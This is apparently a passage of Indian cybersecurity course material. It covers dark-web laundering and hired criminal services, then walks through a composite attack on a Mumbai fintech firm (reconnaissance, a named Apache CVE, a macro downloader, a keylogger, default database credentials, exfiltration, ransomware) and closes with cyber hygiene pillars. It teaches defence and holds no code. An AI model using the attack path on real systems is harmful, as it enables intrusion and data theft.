Dark web transactions primarily use Bitcoin (traceable), Monero (untraceable by design), and Zcash. Criminal proceeds are laundered through "tumbling" services (mixing coins to obscure trail), crypto-to-crypto exchanges without KYC, and DeFi protocols. Monero has become the currency of choice for ransomware gangs and drug markets.

Lazarus Group laundered $455 million in stolen crypto through Tornado Cash mixer before US sanctioned the service
🔫

Hiring Criminal Services

Beyond goods, dark web offers services: DDoS-for-hire attacks (starting at $5/hour), hacking-for-hire targeting specific individuals or companies, contract hitmen (most are scams but represent intent), doxxing services, fake review farms, and bulk SMS/call campaigns for fraud operations.

DDoS-for-hire service "vDOS" generated $600,000 before two Israeli teenagers were arrested
📡

Communication & Coordination

Encrypted forums, chatrooms, and darknet-hosted messaging services allow cybercriminal groups to coordinate, recruit members, share tools and techniques, post announcements of new breaches, and leak stolen data. Telegram has increasingly moved surface-level criminal communication to its encrypted channels.

BreachForums — dark web forum where stolen Indian government databases were first posted and sold
⚠️ Legal Position in India
Accessing the dark web with Tor is not illegal in itself in India. However, buying, selling, or facilitating illegal goods and services on the dark web is fully illegal under the IT Act 2000, IPC/BNS, NDPS Act, and other applicable laws. CBI, ED, and state cyber police have successfully prosecuted dark web drug dealers and data sellers in India. Intelligence agencies actively monitor known dark web markets and Indian .onion forums.

Case Study

Importance of Cyber Hygiene — A Multi-Vector Attack Case Study

Cyber Hygiene refers to the set of regular practices and habitual behaviours that individuals and organisations adopt to maintain the security of their digital environment — analogous to personal hygiene maintaining physical health. Just as washing hands prevents infection, strong passwords, regular updates, and cautious online behaviour prevent cyber compromise. This case study demonstrates how poor cyber hygiene enables a cascading multi-vector attack.
🏦 Case Study — "FinTechCo" Multi-Vector Attack · Mumbai · 2023 (Reconstructed Composite)
Background

FinTechCo is a mid-sized Mumbai fintech company processing UPI and digital lending transactions for 8 lakh customers. The company had a 45-person IT team but no dedicated security operations centre (SOC). Security audits were conducted annually; the last one was 14 months prior. Average employee cybersecurity awareness training: none in the previous 2 years.

Phase 1 — Reconnaissance (Week 1)
  • Attackers used LinkedIn to identify FinTechCo's IT Director, two senior developers, and the CFO's assistant
  • Using theHarvester (OSINT tool), they collected 23 corporate email addresses from public sources
  • A Shodan scan revealed FinTechCo's web server was running an unpatched Apache 2.4.49 (CVE-2021-41773 — path traversal vulnerability)
  • The company's DNS records revealed an admin portal accessible at admin.fintechco.internal — which was mistakenly exposed on the public internet
Phase 2 — Initial Access (Week 2)
  • Attackers sent a spear-phishing email to the CFO's assistant — subject: "Board Meeting Agenda — Urgent Correction Required" — appearing to come from the CFO's spoofed email address
  • The attachment was a macro-enabled Excel file labelled "Q3_BoardDeck_FINAL.xlsx" — the assistant enabled macros, executing a PowerShell downloader
  • Simultaneously, attackers exploited the Apache path traversal vulnerability to read sensitive configuration files from the web server
  • Poor hygiene failure: The assistant's corporate laptop had no endpoint protection and macros were enabled by default. The Apache server had not been patched for 8 months despite the CVE being public for 14 months.
Phase 3 — Lateral Movement and Data Exfiltration (Weeks 3–6)
  • The malware installed a RAT (Remote Access Trojan) providing the attacker full control of the assistant's machine
  • A keylogger captured the assistant's domain credentials, email password, and VPN credentials over 3 days of silent monitoring
  • Using stolen VPN credentials, attackers logged into the internal network — appearing as the legitimate user
  • They discovered the customer database server ran MySQL with default credentials (root/root) — unchanged from initial deployment 3 years prior
  • Over 3 weeks, they silently exfiltrated 8 lakh customer records including Aadhaar numbers, PAN, mobile numbers, loan history, and bank account details
  • Poor hygiene failures: Password reuse, default database credentials, no network segmentation, no DLP (Data Loss Prevention) monitoring, no anomaly detection on VPN access patterns
Phase 4 — Ransomware Deployment (Week 7)
  • Having completed data exfiltration, attackers deployed ransomware encrypting all accessible file servers, backups connected to the network, and the customer database
  • Ransom demand: $800,000 in Monero — with a threat to sell the 8 lakh customer records on a dark web marketplace if not paid within 72 hours (double extortion)
  • FinTechCo discovered the attack when employees arrived Monday morning to find all files encrypted with a ransom note on the screen
  • Poor hygiene failure: Backups were connected to the production network (should be air-gapped) — encrypted along with primary data. No offline backup existed.
Impact and Response
  • Operational downtime: 18 days — complete system rebuild required
  • Customer data: 8,00,000 customers' PII and financial data compromised — notified under DPDPA 2023 provisions
  • Financial loss: Estimated ₹12 crore — downtime (₹4 crore), incident response (₹3 crore), customer compensation (₹2 crore), regulatory penalties (₹2 crore), reputational damage (incalculable)
  • Regulatory: CERT-IN and RBI both investigated — significant penalties and mandatory security audit imposed
  • Legal: Ransom was not paid. Some customer data appeared on BreachForums within 30 days of the attack
The entire attack was enabled by poor cyber hygiene — not by any particularly sophisticated technique. The Apache vulnerability was 14 months old. The database used default credentials unchanged for 3 years. The backup was online and unsegmented. No employee had received phishing awareness training in 2 years. Every single attack step could have been stopped by basic hygiene practices.

The 10 Pillars of Cyber Hygiene

🔄

1. Keep Everything Updated

OS, applications, firmware, antivirus signatures — all updated promptly. Enable automatic updates where possible. Most attacks exploit vulnerabilities that have had patches available for months or years.

🔑

2. Strong Unique Passwords + MFA

Use a password manager to generate and store long, unique passwords for every account. Enable Multi-Factor Authentication on every service that supports it — especially email, banking, and work systems.

💾

3. Regular Offline Backups

Follow the 3-2-1 rule. Test backup restoration regularly — an untested backup is not a backup. Air-gapped offline backups are ransomware-proof by definition.

🔒

4. Encrypt Sensitive Data

Enable full-disk encryption (BitLocker, FileVault) on all laptops. Encrypt data at rest in databases. Use HTTPS for all web communications. Encryption ensures stolen data is useless without the key.

🧠

5. Security Awareness Training

Regular training on phishing, social engineering, and safe browsing for all employees and users. Human error causes 85%+ of breaches — technical controls alone cannot compensate for an untrained workforce.

📉

6. Minimise Attack Surface

Disable or uninstall unused software and services. Close unnecessary open ports (Nmap your own systems). Remove unused user accounts. Reduce the number of entry points an attacker can target.

👁️

7. Monitor and Log

Log all access, authentication, and network events. Use SIEM to detect anomalous behaviour. You cannot defend what you cannot see — visibility is the foundation of effective incident response.

🚦

8. Least Privilege Access

Every user, application, and service should have only the minimum access needed — no more. Regular access reviews remove unnecessary privileges. Limits blast radius when an account is compromised.

📋

9. Incident Response Plan

Have a documented, tested plan for responding to cyber incidents — who does what, in what order. An organisation that plans for breaches recovers in days; one that doesn't may never recover.

Unit 2 — Final Takeaway

Cybercrime techniques — from digital footprint exploitation and social engineering to APTs and dark web marketplaces — form a sophisticated, evolving ecosystem. Yet the FinTechCo case study demonstrates that the most advanced attack chains still rely on the most basic hygiene failures: unpatched systems, default passwords, untrained employees, and inadequate backups. Technology and knowledge of attack techniques matter — but the greatest impact on cybersecurity comes from disciplined, consistent practice of fundamental cyber hygiene. Every topic in this unit ultimately points to the same conclusion: attackers exploit what defenders neglect.
